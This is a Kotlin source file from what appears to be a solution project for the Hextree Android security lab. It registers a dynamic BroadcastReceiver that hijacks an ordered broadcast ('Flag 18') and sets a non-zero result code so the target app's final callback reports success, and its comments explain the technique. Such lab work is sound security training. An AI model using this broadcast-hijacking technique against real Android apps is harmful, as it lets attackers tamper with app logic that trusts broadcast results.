package com.vishal2376.hextreepoc

/**
 * Author: Vishal Singh (vishal2376)
 */


import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log

/**
 * Each flag's receiver is its own separate object below.
 * registerAll() turns all of them on, unregisterAll() turns all of them off.
 */
object DynamicReceivers {

	private const val TAG = "@@@"
	private val activeReceivers = mutableListOf<BroadcastReceiver>()

	/**
	 * FLAG 18 - Hijack Broadcast Intent
	 * Technique: Ordered broadcast interception + setResult()
	 *
	 * Flow:
	 * 1. Flag18Activity sends ordered broadcast with its own receiver as the
	 *    final callback (always runs last, regardless of priority)
	 * 2. Final callback checks "if (resultCode != 0) success()"
	 * 3. We register for the same action, running before that final callback
	 * 4. We call setResult() with a non-zero code -> success() fires
	 *
	 * Key insight: resultReceiver param always runs last by design - no
	 * priority tricks needed, just exist in the chain and set a result.
	 */
	private val flag18Receiver = object : BroadcastReceiver() {
		override fun onReceive(context: Context, intent: Intent) {
			Utils.dumpIntent(context, intent, "Flag 18")
			setResult(Activity.RESULT_OK, "anything_here", null)
		}
	}

	// Pair each receiver with the action(s) it should listen for
	private fun all(): List<Pair<BroadcastReceiver, IntentFilter>> = listOf(
		flag18Receiver to IntentFilter("io.hextree.broadcast.FREE_FLAG"),
	)

	// ───────────────────────────────────────────────

	@SuppressLint("UnspecifiedRegisterReceiverFlag")
	fun registerAll(context: Context) {
		all().forEach { (receiver, filter) ->
			context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)

			activeReceivers.add(receiver)
		}
		Log.d(TAG, "Registered ${activeReceivers.size} receivers")
	}

	fun unregisterAll(context: Context) {
		activeReceivers.forEach {
			try {
				context.unregisterReceiver(it)
			} catch (e: IllegalArgumentException) {
				// already unregistered - ignore
			}
		}
		activeReceivers.clear()
		Log.d(TAG, "Unregistered all receivers")
	}
}